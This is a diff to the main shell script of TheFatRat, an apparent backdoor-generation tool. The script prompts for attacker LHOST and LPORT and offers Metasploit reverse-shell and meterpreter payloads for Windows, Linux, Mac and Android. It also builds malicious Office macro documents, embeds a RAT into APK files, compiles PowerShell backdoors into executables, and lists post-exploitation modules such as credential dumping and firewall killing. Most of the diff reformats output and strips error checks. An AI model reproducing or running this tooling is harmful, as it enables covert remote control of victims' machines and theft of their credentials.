@@ -37,8 +37,8 @@ dist1=`awk '{print $4}' temp/distro.tmp`
 rm -f temp/codename.tmp >/dev/null
 rm -f temp/distro.tmp >/dev/null
 if [ "$dist" == "$lnx" ];
-then 
-dist0=$dist1  
+then
+dist0=$dist1
 else
 dist0=$dist
 fi
@@ -54,6 +54,7 @@ disrov=$rlname
 SERVICE=service;
 apkembed='tools/apkembed.rb' # exec script path
 pwned='python tools/pw_exec.py'
+dave='python tools/trusted_2_6.py'
 B='tools/prog.cs'
 C='tools/dad.c'
 apache='tools/apache.c'
@@ -147,7 +148,7 @@ cat << !
 }
 
 #Microsploit log file
-msploitr () 
+msploitr ()
 {
 rm -rf $msploit >/dev/null 2>&1
 touch $msploit
@@ -623,10 +624,10 @@ echo ""
 				echo ""
 				spinlong
 				echo -e $okegreen""
-echo -e $yellow "Your local IP address is : $lanip"
-echo -e $yellow "Your public IP address is : $publicip"
-echo -e $yellow "Your Hostname is : $hostn"
-echo -e $okegreen ""
+				echo -e $yellow "  Your local IP address is : $lanip"
+				echo -e $yellow "  Your public IP address is : $publicip"
+				echo -e $yellow "  Your Hostname is : $hostn"
+				echo -e $okegreen""
 				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira
 				payload=$(zenity --list --title "☣ TheFatRat ☣" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "linux/ppc/shell_reverse_tcp" FALSE "linux/x86/shell_reverse_tcp" FALSE "linux/x86/meterpreter/reverse_tcp" FALSE "osx/armle/shell_reverse_tcp" FALSE "osx/ppc/shell_reverse_tcp" FALSE "bsd/x86/shell/reverse_tcp" FALSE "solaris/x86/shell_reverse_tcp" --width 350 --height 300) > /dev/null 2>&1
 				spinlong
@@ -643,10 +644,10 @@ echo -e $okegreen ""
 				echo ""
 				spinlong
 				echo -e $okegreen""
-echo -e $yellow "Your local IP address is : $lanip"
-echo -e $yellow "Your public IP address is : $publicip"
-echo -e $yellow "Your Hostname is : $hostn"
-echo -e $okegreen ""
+				echo -e $yellow "  Your local IP address is : $lanip"
+				echo -e $yellow "  Your public IP address is : $publicip"
+				echo -e $yellow "  Your Hostname is : $hostn"
+				echo -e $okegreen""
 				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira
 				payload=$(zenity --list --title "☣ TheFatRat ☣" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/powershell_bind_tcp" FALSE "windows/powershell_reverse_tcp" --width 350 --height 300) > /dev/null 2>&1
          			echo ""
@@ -662,10 +663,10 @@ echo -e $okegreen ""
 				echo ""
 				spinlong
 				echo -e $okegreen""
-echo -e $yellow "Your local IP address is : $lanip"
-echo -e $yellow "Your public IP address is : $publicip"
-echo -e $yellow "Your Hostname is : $hostn"
-echo -e $okegreen ""
+				echo -e $yellow "  Your local IP address is : $lanip"
+				echo -e $yellow "  Your public IP address is : $publicip"
+				echo -e $yellow "  Your Hostname is : $hostn"
+				echo -e $okegreen""
 				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira
 				payload=$(zenity --list --title "☣ TheFatRat ☣" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "android/meterpreter/reverse_http" FALSE "android/meterpreter/reverse_https" FALSE "android/meterpreter/reverse_tcp" FALSE "android/shell/reverse_http" FALSE "android/shell/reverse_https" FALSE "android/shell/reverse_tcp" --width 350 --height 300) > /dev/null 2>&1
 				echo ""
@@ -681,10 +682,10 @@ echo -e $okegreen ""
 				echo ""
 				spinlong
 				echo -e $okegreen""
-echo -e $yellow "Your local IP address is : $lanip"
-echo -e $yellow "Your public IP address is : $publicip"
-echo -e $yellow "Your Hostname is : $hostn"
-echo -e $okegreen ""
+				echo -e $yellow "  Your local IP address is : $lanip"
+				echo -e $yellow "  Your public IP address is : $publicip"
+				echo -e $yellow "  Your Hostname is : $hostn"
+				echo -e $okegreen""
 				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira
 				spinlong
 				echo ""
@@ -700,10 +701,10 @@ echo -e $okegreen ""
 				echo ""
 				spinlong
 				echo -e $okegreen""
-echo -e $yellow "Your local IP address is : $lanip"
-echo -e $yellow "Your public IP address is : $publicip"
-echo -e $yellow "Your Hostname is : $hostn"
-echo -e $okegreen ""
+				echo -e $yellow "  Your local IP address is : $lanip"
+				echo -e $yellow "  Your public IP address is : $publicip"
+				echo -e $yellow "  Your Hostname is : $hostn"
+				echo -e $okegreen""
 				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira
 				spinlong
 				echo ""
@@ -719,10 +720,10 @@ echo -e $okegreen ""
 				echo ""
 				spinlong
 				echo -e $okegreen""
-echo -e $yellow "Your local IP address is : $lanip"
-echo -e $yellow "Your public IP address is : $publicip"
-echo -e $yellow "Your Hostname is : $hostn"
-echo -e $okegreen ""
+				echo -e $yellow "  Your local IP address is : $lanip"
+				echo -e $yellow "  Your public IP address is : $publicip"
+				echo -e $yellow "  Your Hostname is : $hostn"
+				echo -e $okegreen""
 				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira
 				spinlong
 				echo ""
@@ -738,10 +739,10 @@ echo -e $okegreen ""
 				echo ""
 				spinlong
 				echo -e $okegreen""
-echo -e $yellow "Your local IP address is : $lanip"
-echo -e $yellow "Your public IP address is : $publicip"
-echo -e $yellow "Your Hostname is : $hostn"
-echo -e $okegreen ""
+				echo -e $yellow "  Your local IP address is : $lanip"
+				echo -e $yellow "  Your public IP address is : $publicip"
+				echo -e $yellow "  Your Hostname is : $hostn"
+				echo -e $okegreen""
 				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira
 				spinlong
 				echo ""
@@ -757,10 +758,10 @@ echo -e $okegreen ""
 				echo ""
 				spinlong
 				echo -e $okegreen""
-echo -e $yellow "Your local IP address is : $lanip"
-echo -e $yellow "Your public IP address is : $publicip"
-echo -e $yellow "Your Hostname is : $hostn"
-echo -e $okegreen ""
+				echo -e $yellow "  Your local IP address is : $lanip"
+				echo -e $yellow "  Your public IP address is : $publicip"
+				echo -e $yellow "  Your Hostname is : $hostn"
+				echo -e $okegreen""
 				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira
 				spinlong
 				echo ""
@@ -776,10 +777,10 @@ echo -e $okegreen ""
 				echo ""
 				spinlong
 				echo -e $okegreen""
-echo -e $yellow "Your local IP address is : $lanip"
-echo -e $yellow "Your public IP address is : $publicip"
-echo -e $yellow "Your Hostname is : $hostn"
-echo -e $okegreen ""
+				echo -e $yellow "  Your local IP address is : $lanip"
+				echo -e $yellow "  Your public IP address is : $publicip"
+				echo -e $yellow "  Your Hostname is : $hostn"
+				echo -e $okegreen""
 				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira
 				spinlong
 				echo ""
@@ -795,10 +796,10 @@ echo -e $okegreen ""
 				echo ""
 				spinlong
 				echo -e $okegreen""
-echo -e $yellow "Your local IP address is : $lanip"
-echo -e $yellow "Your public IP address is : $publicip"
-echo -e $yellow "Your Hostname is : $hostn"
-echo -e $okegreen ""
+				echo -e $yellow "  Your local IP address is : $lanip"
+				echo -e $yellow "  Your public IP address is : $publicip"
+				echo -e $yellow "  Your Hostname is : $hostn"
+				echo -e $okegreen""
 				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira
 				spinlong
 				echo ""
@@ -814,11 +815,11 @@ echo -e $okegreen ""
 				echo ""
 				spinlong
 				echo -e $okegreen""
-echo -e $yellow "Your local IP address is : $lanip"
-echo -e $yellow "Your public IP address is : $publicip"
-echo -e $yellow "Your Hostname is : $hostn"
-echo -e $okegreen ""
-				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira
+				echo -e $yellow "  Your local IP address is : $lanip"
+				echo -e $yellow "  Your public IP address is : $publicip"
+				echo -e $yellow "  Your Hostname is : $hostn"
+				echo -e $okegreen""
+        			read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira
 				spinlong
 				echo ""
 				echo ""
@@ -833,12 +834,12 @@ echo -e $okegreen ""
        				then
          				echo
 					echo -e $yellow"  Worked on Microsoft Office 2007 [no-SP/SP1/SP2/SP3] English on Windows [XP SP3 / 7 SP1] "
-					echo -e $okegreen""
-echo -e $yellow "Your local IP address is : $lanip"
-echo -e $yellow "Your public IP address is : $publicip"
-echo -e $yellow "Your Hostname is : $hostn"
-echo -e $okegreen ""
-					echo -ne "  SET LHOST : ";tput sgr0
+					  echo -e $okegreen""
+					  echo -e $yellow "  Your local IP address is : $lanip"
+					  echo -e $yellow "  Your public IP address is : $publicip"
+					  echo -e $yellow "  Your Hostname is : $hostn"
+					  echo -e $okegreen""
+					  echo -ne "  SET LHOST : ";tput sgr0
 					read yourip
 					echo ""
 					echo -ne $okegreen " SET LPORT : ";tput sgr0
@@ -867,12 +868,12 @@ echo -e $okegreen ""
 				  then
 				   	echo
   					echo -e $yellow"  Worked on All Windows "
-  					echo -e $okegreen""
-echo -e $yellow "Your local IP address is : $lanip"
-echo -e $yellow "Your public IP address is : $publicip"
-echo -e $yellow "Your Hostname is : $hostn"
-echo -e $okegreen ""
-  					echo -ne "  SET LHOST : ";tput sgr0
+					    echo -e $okegreen""
+					    echo -e $yellow "  Your local IP address is : $lanip"
+					    echo -e $yellow "  Your public IP address is : $publicip"
+					    echo -e $yellow "  Your Hostname is : $hostn"
+					    echo -e $okegreen""
+					    echo -ne "  SET LHOST : ";tput sgr0
   					read yourip
   					echo ""
   					echo -ne $okegreen " SET LPORT : ";tput sgr0
@@ -954,11 +955,11 @@ echo -e $okegreen"  ============================================================
 				payload=$(zenity --list --title "☣ TheFatRat ☣" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "linux/ppc/shell_reverse_tcp" FALSE "linux/x86/shell_reverse_tcp" FALSE "linux/x86/meterpreter/reverse_tcp" FALSE "osx/armle/shell_reverse_tcp" FALSE "osx/ppc/shell_reverse_tcp" FALSE "bsd/x86/shell/reverse_tcp" FALSE "solaris/x86/shell_reverse_tcp" --width 350 --height 300) > /dev/null 2>&1
            	 		echo set PAYLOAD $payload >> "temp/meterpreter_linux.rc"
 				echo -e $okegreen""
-echo -e $yellow "Your local IP address is : $lanip"
-echo -e $yellow "Your public IP address is : $publicip"
-echo -e $yellow "Your Hostname is : $hostn"
-echo -e $okegreen ""
-           	 		read -p '  Set LHOST IP: ' uservar
+				echo -e $yellow "  Your local IP address is : $lanip"
+				echo -e $yellow "  Your public IP address is : $publicip"
+				echo -e $yellow "  Your Hostname is : $hostn"
+				echo -e $okegreen""
+				read -p '  Set LHOST IP: ' uservar
            	 		echo set LHOST $uservar >> "temp/meterpreter_linux.rc"
            	 		read -p '  Set LPORT: ' uservar
            	 		echo set LPORT $uservar >> "temp/meterpreter_linux.rc"
@@ -975,7 +976,7 @@ echo -e $okegreen ""
                                 xterm -fa monaco -fs 13 -bg black -e $msfconsole -r "temp/meterpreter_linux.rc"
                                 clear
                                 fi
-           	 		
+
 			elif test $fatrat1 == '2' #Windows
 				then
 				rm temp/*.rc > /dev/null 2>&1
@@ -984,11 +985,11 @@ echo -e $okegreen ""
 				payload=$(zenity --list --title "☣ TheFatRat ☣" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/powershell_bind_tcp" FALSE "windows/powershell_reverse_tcp" --width 350 --height 300) > /dev/null 2>&1
            	 		echo set PAYLOAD $payload >> "temp/meterpreter_windows.rc"
 				pe=$(zenity --list --title "☣ TheFatRat ☣" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "auto_migrate+killfirewall.rc" --width 350 --height 240) > /dev/null 2>&1
-				echo -e $okegreen ""
-                                echo -e $yellow "Your local IP address is : $lanip"
-                                echo -e $yellow "Your public IP address is : $publicip"
-                                echo -e $yellow "Your Hostname is : $hostn"
-                                echo -e $green ""
+				echo -e $okegreen""
+				echo -e $yellow "  Your local IP address is : $lanip"
+				echo -e $yellow "  Your public IP address is : $publicip"
+				echo -e $yellow "  Your Hostname is : $hostn"
+				echo -e $okegreen""
            	 		read -p '  Set LHOST IP: ' uservar
            	 		echo set LHOST $uservar >> "temp/meterpreter_windows.rc"
            	 		read -p '  Set LPORT: ' uservar
@@ -1007,18 +1008,18 @@ echo -e $okegreen ""
                                 xterm -fa monaco -fs 13 -bg black -e $msfconsole -r "temp/meterpreter_windows.rc"
                                 clear
                                 fi
-           	 		
+
 			elif test $fatrat1 == '3'  #Mac
 				then
 				rm temp/*.rc > /dev/null 2>&1
 				touch "temp/meterpreter_mac.rc"
            	 		echo use exploit/multi/handler > "temp/meterpreter_mac.rc"
            	 		echo set PAYLOAD osx/x86/shell_reverse_tcp >> "temp/meterpreter_mac.rc"
-				echo -e $okegreen ""
-                                echo -e $yellow "Your local IP address is : $lanip"
-                                echo -e $yellow "Your public IP address is : $publicip"
-                                echo -e $yellow "Your Hostname is : $hostn"
-                                echo -e $green ""
+				echo -e $okegreen""
+				echo -e $yellow "  Your local IP address is : $lanip"
+				echo -e $yellow "  Your public IP address is : $publicip"
+				echo -e $yellow "  Your Hostname is : $hostn"
+				echo -e $okegreen""
            	 		read -p '  Set LHOST IP: ' uservar
            	 		echo set LHOST $uservar >> "temp/meterpreter_mac.rc"
            	 		read -p '  Set LPORT: ' uservar
@@ -1036,7 +1037,7 @@ echo -e $okegreen ""
                                 xterm -fa monaco -fs 13 -bg black -e $msfconsole -r "temp/meterpreter_mac.rc"
                                 clear
                                 fi
-           	 		
+
 			elif test $fatrat1 == '4' #Android
 				then
 				rm temp/*.rc > /dev/null 2>&1
@@ -1044,11 +1045,11 @@ echo -e $okegreen ""
            	 		echo use exploit/multi/handler > "temp/meterpreter_android.rc"
 				payload=$(zenity --list --title "☣ TheFatRat ☣" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "android/meterpreter/reverse_http" FALSE "android/meterpreter/reverse_https" FALSE "android/meterpreter/reverse_tcp" FALSE "android/shell/reverse_http" FALSE "android/shell/reverse_https" FALSE "android/shell/reverse_tcp" --width 350 --height 300) > /dev/null 2>&1
            	 		echo set PAYLOAD $payload >> "temp/meterpreter_android.rc"
-				echo -e $okegreen ""
-                                echo -e $yellow "Your local IP address is : $lanip"
-                                echo -e $yellow "Your public IP address is : $publicip"
-                                echo -e $yellow "Your Hostname is : $hostn"
-                                echo -e $okegreen ""
+				echo -e $okegreen""
+				echo -e $yellow "  Your local IP address is : $lanip"
+				echo -e $yellow "  Your public IP address is : $publicip"
+				echo -e $yellow "  Your Hostname is : $hostn"
+				echo -e $okegreen""
            	 		read -p '  Set LHOST IP: ' uservar
            	 		echo set LHOST $uservar >> "temp/meterpreter_android.rc"
            	 		read -p '  Set LPORT: ' uservar
@@ -1066,7 +1067,7 @@ echo -e $okegreen ""
                                 xterm -fa monaco -fs 13 -bg black -e $msfconsole -r "temp/meterpreter_android.rc"
                                 clear
                                 fi
-           	 		
+
                               elif test $fatrat1 == '5'
                               then
                   listener=$(zenity --file-selection --file-filter='RC files (rc) | *.rc' --title="Load your config file" --filename=$path/config/listeners/ );
@@ -1141,12 +1142,12 @@ read choice
 case $choice in
    1)
           echo -e $red"   Worked on Microsoft Office 2007 [no-SP/SP1/SP2/SP3] English on Windows [XP SP3 / 7 SP1] "
-					echo -e $okegreen""
-echo -e $yellow "Your local IP address is : $lanip"
-echo -e $yellow "Your public IP address is : $publicip"
-echo -e $yellow "Your Hostname is : $hostn"
-echo -e $okegreen ""
-					echo -ne "   SET LHOST : ";tput sgr0
+          echo -e $okegreen""
+          echo -e $yellow "  Your local IP address is : $lanip"
+          echo -e $yellow "  Your public IP address is : $publicip"
+          echo -e $yellow "  Your Hostname is : $hostn"
+          echo -e $okegreen""
+          echo -ne "   SET LHOST : ";tput sgr0
 					read yourip
 					echo ""
 					echo -ne $okegreen "  SET LPORT : ";tput sgr0
@@ -1202,10 +1203,10 @@ fi
 2)
           echo -e $red"\n   Worked on Microsoft Office on Windows  "
 					echo -e $okegreen""
-                                        echo -e $yellow "Your local IP address is : $lanip"
-                                        echo -e $yellow "Your public IP address is : $publicip"
-                                        echo -e $yellow "Your Hostname is : $hostn"
-                                        echo -e $okegreen ""
+          echo -e $yellow "  Your local IP address is : $lanip"
+          echo -e $yellow "  Your public IP address is : $publicip"
+          echo -e $yellow "  Your Hostname is : $hostn"
+          echo -e $okegreen""
 					echo -ne "   SET LHOST : ";tput sgr0
 					read yourip
 					echo ""
@@ -1309,7 +1310,7 @@ fi
          	echo ""
          	mv ~/.msf4/local/$fira.docm $path/output/$fira.docm >>$msploit 2>&1
 					echo ""
-         	
+
                 fidoc=$path/output/$fira.docm
                 if [ -f "$fidoc" ]
                 then
@@ -1329,12 +1330,12 @@ fi
 
 3)
           echo -e $red"   Worked on Libre Office on Mac ( Python )  "
-					echo -e $okegreen""
-echo -e $yellow "Your local IP address is : $lanip"
-echo -e $yellow "Your public IP address is : $publicip"
-echo -e $yellow "Your Hostname is : $hostn"
-echo -e $okegreen ""
-					echo -ne "   SET LHOST : ";tput sgr0
+          echo -e $okegreen""
+          echo -e $yellow "  Your local IP address is : $lanip"
+          echo -e $yellow "  Your public IP address is : $publicip"
+          echo -e $yellow "  Your Hostname is : $hostn"
+          echo -e $okegreen""
+          echo -ne "   SET LHOST : ";tput sgr0
 					read yourip
 					echo ""
 					echo -ne $okegreen "  SET LPORT : ";tput sgr0
@@ -1390,7 +1391,7 @@ echo -e $okegreen ""
          	echo ""
     			mv ~/.msf4/local/$fira.docm $path/output/$fira.docm >>$msploit 2>&1
         	echo -e $okegreen""
-         	
+
                 fidoc=$path/output/$fira.docm
                 if [ -f "$fidoc" ]
                 then
@@ -1461,11 +1462,12 @@ fi
 4)
           echo -e $red"   Apache OpenOffice on Windows (PSH) "
 					echo -e $okegreen""
-echo -e $yellow "Your local IP address is : $lanip"
-echo -e $yellow "Your public IP address is : $publicip"
-echo -e $yellow "Your Hostname is : $hostn"
-echo -e $okegreen ""
-					echo -ne "   SET LHOST : ";tput sgr0
+          echo -e $okegreen""
+          echo -e $yellow "  Your local IP address is : $lanip"
+          echo -e $yellow "  Your public IP address is : $publicip"
+          echo -e $yellow "  Your Hostname is : $hostn"
+          echo -e $okegreen""
+	        echo -ne "   SET LHOST : ";tput sgr0
 					read yourip
 					echo ""
 					echo -ne $okegreen "  SET LPORT : ";tput sgr0
@@ -1530,11 +1532,11 @@ fi
 
       5)
                    echo -e $red"   Apache OpenOffice on Linux (PSH) "
-					echo -e $okegreen""
-                                        echo -e $yellow "Your local IP address is : $lanip"
-                                        echo -e $yellow "Your public IP address is : $publicip"
-                                        echo -e $yellow "Your Hostname is : $hostn"
-                                        echo -e $okegreen ""
+                   echo -e $okegreen""
+                   echo -e $yellow "  Your local IP address is : $lanip"
+                   echo -e $yellow "  Your public IP address is : $publicip"
+                   echo -e $yellow "  Your Hostname is : $hostn"
+                   echo -e $okegreen""
 					echo -ne "   SET LHOST : ";tput sgr0
 					read yourip
 					echo ""
@@ -1631,10 +1633,10 @@ rm -rf output/*
 sleep 2
 echo "Done!"
 echo -e $okegreen""
-echo -e $yellow "Your local IP address is : $lanip"
-echo -e $yellow "Your public IP address is : $publicip"
-echo -e $yellow "Your Hostname is : $hostn"
-echo -e $okegreen ""
+echo -e $yellow "  Your local IP address is : $lanip"
+echo -e $yellow "  Your public IP address is : $publicip"
+echo -e $yellow "  Your Hostname is : $hostn"
+echo -e $okegreen""
 echo -ne " SET LHOST : ";tput sgr0
 read yourip
 echo ""
@@ -1704,7 +1706,7 @@ then
 echo "[✔] Done!"
 else
 echo -e $red ""
-echo "[x] There was an error in the creation of the payload . 
+echo "[x] There was an error in the creation of the payload .
 Check log file at : $log"
 rm -rf temp/* > /dev/null 2>&1
 menu
@@ -1732,7 +1734,7 @@ sleep 2
 echo "[*] Starting the merging process of RAT with the APK you selected"
 echo -e $okegreen ""
 
-#Starting the process of inserting the payload into original apk file 
+#Starting the process of inserting the payload into original apk file
 ruby $apkembed $path/temp/app.apk
 sleep 2
 
@@ -1833,6 +1835,7 @@ esac
 #PwnWind v1.2
 #Developed or original code Edo Maland (Screetsec)
 ############################################################
+############################################################
 function PwnWinds() {
 clear
 echo ""
@@ -1876,11 +1879,11 @@ echo -e $red"  	     Powershell$cyan Injection attacks on any$red Windows Platfo
 			if test $fatrat1 == '1' #NUMBER 1 BEBE
 				then
 					echo ""
-					echo -e $okegreen""
-echo -e $yellow "Your local IP address is : $lanip"
-echo -e $yellow "Your public IP address is : $publicip"
-echo -e $yellow "Your Hostname is : $hostn"
-echo -e $okegreen ""
+					  echo -e $okegreen""
+					  echo -e $yellow "  Your local IP address is : $lanip"
+					  echo -e $yellow "  Your public IP address is : $publicip"
+					  echo -e $yellow "  Your Hostname is : $hostn"
+					  echo -e $okegreen ""
 					echo -ne "  SET LHOST : ";tput sgr0
 					read yourip
 					echo ""
@@ -1896,33 +1899,13 @@ echo -e $okegreen ""
 					gboor
 					spinlong
 					echo ""
-                                        $pwned $payload $yourip $yourport 
+					$dave $payload $yourip $yourport > /dev/null 2>&1
 					echo ""
 					echo ""
-                                        power=$path/powershell_attack.txt
-                                        if [ ! -f "$power" ]
-                                        then
-                                        echo -e $red ""
-                                        echo "Unable to find the output $power"
-                                        echo -e $okegreen ""
-read -rsp $'Press any key to return to return to menu\n' -n 1 key
-clear
-PwnWinds
-fi
 					cat powershell_attack.txt
 					sleep 2
 					rm unicorn.rc
 					mv powershell_attack.txt output/$fira.bat
-                                        otf=$path/output/$fira.bat
-                                        if [ ! -f "$otf" ]
-                                        then
-                                        echo -e $red ""
-                                        echo "Unable to create $otf"
-                                        echo -e $okegreen ""
-read -rsp $'Press any key to return to return to menu\n' -n 1 key
-clear
-PwnWinds
-fi
 					echo ""
 					echo -e $okegreen""
 					echo -e "Backdoor Saved To output Folder "
@@ -1930,11 +1913,11 @@ fi
 					elif test $fatrat1 == '2' #cPAGAR-POWERSHELL
 					then
 					echo ""
-					echo -e $okegreen""
-echo -e $yellow "Your local IP address is : $lanip"
-echo -e $yellow "Your public IP address is : $publicip"
-echo -e $yellow "Your Hostname is : $hostn"
-echo -e $okegreen ""
+					  echo -e $okegreen""
+					  echo -e $yellow "  Your local IP address is : $lanip"
+					  echo -e $yellow "  Your public IP address is : $publicip"
+					  echo -e $yellow "  Your Hostname is : $hostn"
+					  echo -e $okegreen ""
 					echo -ne "  SET LHOST : ";tput sgr0
 					read yourip
 					echo ""
@@ -1949,78 +1932,26 @@ echo -e $okegreen ""
 					echo ""
 					gboor
 					spinlong
-					echo -e $okegreen ""
-                                        echo "[*] Creating your powershell payload"
-					$msfvenom -p $payload LHOST=$yourip LPORT=$yourport -f psh-cmd -o temp/powershell.txt > /dev/null 2>&1
+					echo ""
+					$pwned $payload $yourip $yourport > /dev/null 2>&1
 					echo ""
 					echo ""
-power=$path/temp/powershell.txt
-                                        if [ ! -f "$power" ]
-                                        then
-                                        echo -e $red ""
-                                        echo "[x] Unable to create powershell payload ."
-                                        echo -e $okegreen ""
-read -rsp $'Press any key to return to return to menu\n' -n 1 key
-clear
-PwnWinds
-fi
-                                        echo "[✔] Done!"
-					cp $B $path/output/Program.cs
-                                        tgt=$path/output/Program.cs
-                                        pld=$(cat temp/powershell.txt)
-                                        
-#Inserting Payload into Program.cs file
-echo "[*] Merging your payload into final script"
-                                        sed -i "s|PAYLOAD|$pld|g" $tgt
-                                        
-powerf=$path/output/Program.cs
-size=6
-actualsize=$(du -k "$powerf" | cut -f 1)
-                                        if [ $actualsize -ge $size ]
-                                        then
-                                        echo -e $okegreen ""
-echo "[✔] Done!"
-else 
-echo -e $red ""
-echo "[x] There was an error payload into final script file "
-echo ""
-                                        rm $bcom >/dev/null 2>&1
-                                        rm temp/powershell.txt >/dev/null 2>&1
-echo -e $okegreen ""
-read -rsp $'Press any key to return to return to menu\n' -n 1 key
-clear
-PwnWinds
-fi
-                                        echo -e $okegreen ""
-sleep 2
-echo "[*] Compiling your powershell backdoor "
 
+					s0=$(cat powershell_attack.txt | cut -d ' ' -f1)
+					s1=$(cat powershell_attack.txt | cut -d ' ' -f2)
+					s2=$(cat powershell_attack.txt | cut -d ' ' -f3)
+					s3=$(cat powershell_attack.txt | cut -d ' ' -f4)
+					s4=$(cat powershell_attack.txt | cut -d ' ' -f5)
 
+					sed s/PAYLOAD/$s0\ $s1\ $s2\ $s3\ $s4/g $B > $bcom
+					echo
 					dmcs $bcom -o "output/$fira.exe" > /dev/null 2>&1
-power=$path/output/$fira.exe
-                                        if [ ! -f "$power" ]
-                                        then
-                                        echo -e $red ""
-                                        echo "Unable to compile with mono $powerf into $power"
-                                        echo -e $okegreen ""
-                                        rm $bcom >/dev/null 2>&1
-                                        rm temp/powershell.txt >/dev/null 2>&1
-                                        
-read -rsp $'Press any key to return to return to menu\n' -n 1 key
-clear
-PwnWinds
-fi
-echo -e $okegreen ""
-echo "[✔] Done!"
-					rm $bcom >/dev/null 2>&1
-                                        rm temp/powershell.txt >/dev/null 2>&1
+					rm unicorn.rc powershell_attack.txt $bcom
 					sleep 2
 					echo ""
 					echo -e $okegreen""
 					echo -e "Backdoor Saved To output Folder "
-read -rsp $'Press any key to return to return to menu\n' -n 1 key
-clear
-PwnWinds
+
 
 
 				elif test $fatrat1 == '3' #Apachecompler
@@ -2030,11 +1961,11 @@ PwnWinds
 					echo -e $okegreen " Starting Apache Server wait ..."
 					service apache2 start > /dev/null 2>&1
 					echo ""
-echo -e $okegreen""
-echo -e $yellow "Your local IP address is : $lanip"
-echo -e $yellow "Your public IP address is : $publicip"
-echo -e $yellow "Your Hostname is : $hostn"
-echo -e $okegreen ""
+					  echo -e $okegreen""
+					  echo -e $yellow "  Your local IP address is : $lanip"
+					  echo -e $yellow "  Your public IP address is : $publicip"
+					  echo -e $yellow "  Your Hostname is : $hostn"
+					  echo -e $okegreen ""
 					echo -ne "  SET LHOST : ";tput sgr0
 					read yourip
 					echo ""
@@ -2050,7 +1981,7 @@ echo -e $okegreen ""
 					gboor
 					spinlong
 					echo ""
-					$pwned $payload $yourip $yourport
+					$pwned $payload $yourip $yourport > /dev/null 2>&1
 					echo ""
 					echo $yourip >> "$out"
 
@@ -2060,22 +1991,11 @@ echo -e $okegreen ""
 					echo
 					$COMPILER -Wall -mwindows icons/icon.res $apachecom -o "output/$fira.exe" > /dev/null 2>&1
 					rm unicorn.rc  $apachecom $out
-power=$path/powershell_attack.txt
-                                        if [ ! -f "$power" ]
-                                        then
-                                        echo -e $red ""
-                                        echo "Unable to find $power"
-                                        echo -e $okegreen ""
-read -rsp $'Press any key to return to return to menu\n' -n 1 key
-clear
-PwnWinds
-fi
 					mv powershell_attack.txt $apache2
 					sleep 2
 					echo ""
 					echo -e $okegreen""
-                                        rm -rf $path/output/Program.cs >/dev/null 2>&1
-                                    	echo -e $okegreen "  Backdoor Saved To output Folder "
+					echo -e "  Backdoor Saved To output Folder "
 					echo ""
 					echo -ne "  Press any key to continue ......... "
 					read continue
@@ -2084,11 +2004,11 @@ fi
 					elif test $fatrat1 == '4' #C AJA
 					then
 					echo ""
-					echo -e $okegreen""
-echo -e $yellow "Your local IP address is : $lanip"
-echo -e $yellow "Your public IP address is : $publicip"
-echo -e $yellow "Your Hostname is : $hostn"
-echo -e $okegreen ""
+					  echo -e $okegreen""
+					  echo -e $yellow "  Your local IP address is : $lanip"
+					  echo -e $yellow "  Your public IP address is : $publicip"
+					  echo -e $yellow "  Your Hostname is : $hostn"
+					  echo -e $okegreen ""
 					echo -ne "  SET LHOST : ";tput sgr0
 					read yourip
 					echo ""
@@ -2104,19 +2024,10 @@ echo -e $okegreen ""
 					gboor
 					spinlong
 					echo ""
-					$pwned $payload $yourip $yourport
+					$pwned $payload $yourip $yourport > /dev/null 2>&1
 					echo ""
 					echo ""
-power=$path/powershell_attack.txt
-                                        if [ ! -f "$power" ]
-                                        then
-                                        echo -e $red ""
-                                        echo "Unable to find $power"
-                                        echo -e $okegreen ""
-read -rsp $'Press any key to return to return to menu\n' -n 1 key
-clear
-PwnWinds
-fi
+
 					s0=$(cat powershell_attack.txt | cut -d ' ' -f1)
 					s1=$(cat powershell_attack.txt | cut -d ' ' -f2)
 					s2=$(cat powershell_attack.txt | cut -d ' ' -f3)
@@ -2125,15 +2036,6 @@ fi
 
 					sed s/PAYLOAD/$s0\ $s1\ $s2\ $s3\ $s4/g $C > $paycom
 					echo
-                                        if [ ! -f "$paycom" ]
-                                        then
-                                        echo -e $red ""
-                                        echo "Unable to find $paycom"
-                                        echo -e $okegreen ""
